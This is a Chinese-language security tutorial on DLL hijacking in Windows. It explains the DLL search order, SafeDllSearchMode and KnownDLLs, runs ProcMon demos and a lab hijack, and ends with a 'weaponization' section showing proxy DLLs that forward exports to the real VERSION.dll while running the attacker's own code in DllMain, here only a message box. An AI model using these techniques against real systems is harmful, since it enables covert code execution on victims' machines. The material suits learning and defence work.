---
description: dll hijack
---

# DLL劫持

## DLL简介

> 在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。

为了防止单个应用程序过于庞大和增加程序可维护性，windows系统使用dll实现了程序的模块化，这样能让单个程序或模块更加易于维护，同时由于应用程序普遍存在功能性的重复，这些功能模块\(dll\)又能被不同的应用程序复用，这样就显著减小的程序的体积和占用的内存，同时便于管理。

## DLL的加载顺序

如果程序需要加载一个相对路径的dll文件，它将从当前目录下尝试查找，如果找不到，则按照如下顺序寻找：

> #### windows xp sp2之前
>
> Windows查找DLL的目录以及对应的顺序：
>
> 1. 进程对应的应用程序所在目录；
>
> 2. 当前目录（Current Directory）；
>
> 3. 系统目录（通过 GetSystemDirectory 获取）；
>
> 4. 16位系统目录；
>
> 5. Windows目录（通过 GetWindowsDirectory 获取）；
>
> 6. PATH环境变量中的各个目录；
>
> 例如：对于文件系统，如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。
>
> #### windows xp sp2之后
>
> Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：
>
> 默认注册表为：HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1
>
> 1. 进程对应的应用程序所在目录（可理解为程序安装目录比如C:\ProgramFiles\uTorrent）
>
> 2. 系统目录（即%windir%system32）；
>
> 3. 16位系统目录（即%windir%system）；
>
> 4. Windows目录（即%windir%）；
>
> 5. 当前目录（运行的某个文件所在目录，比如C:\Documents and Settings\Administrator\Desktop\test）；
>
> 6. PATH环境变量中的各个目录；
>
> #### windows 7 以上版本
>
> 系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：
>
> HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
>
> 那么最终Windows2003以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。
>
> * 默认情况下，如果软件安装在c盘根目录，而不是c:\Program Files，那经过身份验证的用户具有该目录的写权限，另外，perl，python，ruby等软件通常都添加到path变量中。那攻击者可以在当前目录中编写恶意DLL，只要重新运行exe程序就会中招。
> * SafeDllSearchMode + KnownDLLs二者结合可用来防范dll劫持，但是如果调用"不常见"的dll，也就是并未出现在KnownDLLs的列表中，那么无论SafeDllSearchMode是否开启，dll搜索的第一顺序均为程序的当前目录，这里就存在一个DLL劫持漏洞（在程序同级目录下预先放置一个同名dll，在进程启动的过程中会优先加载，实现劫持。\)

在这里我们写个demo简单验证下dll的加载次序，使用如下代码和processmon进行监控：

```text
#include <WINDOWS.H>

int main() {
	LoadLibraryA("test.dll");
	return 0;
}
```

![](../.gitbook/assets/image%20%2874%29.png)

符合我们的预期，接下来我们再测试一下KnownDlls内的dll加载次序:

```text
#include <WINDOWS.H>

int main() {
	HMODULE hModule= LoadLibraryA("user32.dll");
	FreeLibrary(hModule);
	return 0;
}
```

![](../.gitbook/assets/image%20%2876%29.png)

![](../.gitbook/assets/image%20%286%29.png)

同样符合我们的预期，那我们猜测，是否存在这样一些没有保存在KnownDlls同时又存在于dll最先加载次序之后的dll模块呢，如果我们能找到这样的模块，同时又对较高顺位的加载目录有写入权限，那我们就能控制这个程序加载的模块代码，这种技术被称之为dll劫持。\(虽然不是高深的技术，狗头\)。

## DLL文件结构

编译后的DLL文件遵循与EXE相同的PE结构，但在源代码编写上存在显著差别，通常dll有一个可选的dllmain函数，这个函数会在dll载入后的某些情况下被进程自身所调用。

代码如下:

```text
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){
  
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        printf("Process attach. \n");
        break;
        case DLL_PROCESS_DETACH:
        printf("Process detach. \n");
        break;
        case DLL_THREAD_ATTACH:
        printf("Thread attach. \n");
        break;
        case DLL_THREAD_DETACH:
        printf("Thread detach. \n");
        break;
    }
return (TRUE);
}
```

通常dllmain函数会被用来初始化环境、引用计数和清理环境，但同时也可以被写入恶意代码。

## 劫持实验

预想一种实验:

某程序需要使用一个system32下的dll，同时该dll并未注册为KnownDlls，这时我们在程序当前目录写入一个同名dll。

![](../.gitbook/assets/image%20%2821%29.png)

编写dll放入system32，运行程序。

![](../.gitbook/assets/image%20%2837%29.png)

![](../.gitbook/assets/image%20%2868%29.png)

![](../.gitbook/assets/image%20%2875%29.png)

这时我们在程序所在目录放置恶意dll。

![](../.gitbook/assets/image%20%2864%29.png)

![](../.gitbook/assets/image%20%2836%29.png)

恶意dll先于合法dll加载。

## 武器化

> 另外，每个DLL文件中都包含有一个导出函数表也叫输出表（存在于PE的.edata节中）。使用一些PE文件查看工具如LoadPE，就可以查看导出函数的符号名即函数名称和函数在导出函数表中的标识号。
>
> 应用程序导入函数与DLL文件中的导出函数进行链接有两种方式：隐式链接（load-time dynamic linking）也叫静态调用和显式链接（run-time dynamic linking）也叫动态调用。隐式链接方式一般用于开发和调试，而显式链接方式就是我们常见的使用LoadLibary或者LoadLibraryEx函数（注：涉及到模块加载的函数有很多）来加载DLL去调用相应的导出函数。调用LoadLibrary或者LoadLibraryEx函数时可以使用DLL的相对路径也可以使用绝对路径，但是很多情况下，开发人员都是使用了相对路径来进行DLL的加载。那么，在这种情况下，Windows系统会按照特定的顺序去搜索一些目录，来确定DLL的完整路径。

如果我们编写一个单纯只包含dllmain函数的dll，虽然写在dllmain函数内的代码仍旧能被执行，但是当程序实际使用到dll中的导出函数时，我们编写的dll并未编写这个函数，这样往往会使程序产生报错或崩溃，这样并不利于我们在实战中使用，所以在编写一个武器化的dll时，我们通常还要让dll的导出表与原dll一致，同时对函数进行向原dll的转发，这样我们就能在用户五察觉的情况下运行自定义的代码。

通常这样的恶意dll有两种编写方式:

* 直接转发函数:

```text
#pragma comment(linker, "/EXPORT:MessageBoxA=OLD_DLL.MessageBoxA")
```

* 动态调用:

```text
//导出
#pragma comment(linker, "/EXPORT:GetFileVersionInfoA=_DG_GetFileVersionInfoA,@1")

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		// 绝对路径加载VERSION.dll
		LoadLibrary("C:\\Windows\\System32\\VERSION.dll");

		MessageBox(NULL, "调用函数方法", "From DLL Hijack", MB_OK | MB_ICONWARNING);
		break;
	}
	case DLL_THREAD_ATTACH:
	{
		break;
	}
	case DLL_THREAD_DETACH:
	{
		// 卸载VERSION.dll
		HMODULE hDll = GetModuleHandle("C:\\Windows\\System32\\VERSION.dll");
		if (hDll)
		{
			FreeLibrary(hDll);
		}
		break;
	}
	case DLL_PROCESS_DETACH:
	{
		break;
	}
		break;
	}
	return TRUE;
}
PVOID GetFunctionAddress(char* pszFunctionName)
{
	PVOID pAddr = NULL;
	HMODULE hDll = NULL;
	char szDllPath[MAX_PATH] = "C:\\Windows\\System32\\VERSION.dll";

	hDll = LoadLibrary(szDllPath);
	if (NULL == hDll)
	{
		return NULL;
	}
	pAddr = GetProcAddress(hDll, pszFunctionName);
	FreeLibrary(hDll);

	return pAddr;
}

```

## LINKS

{% embed url="https://www.cnblogs.com/bmjoker/p/11031238.html" %}

{% embed url="https://www.cnblogs.com/swyft/articles/5580342.html" %}





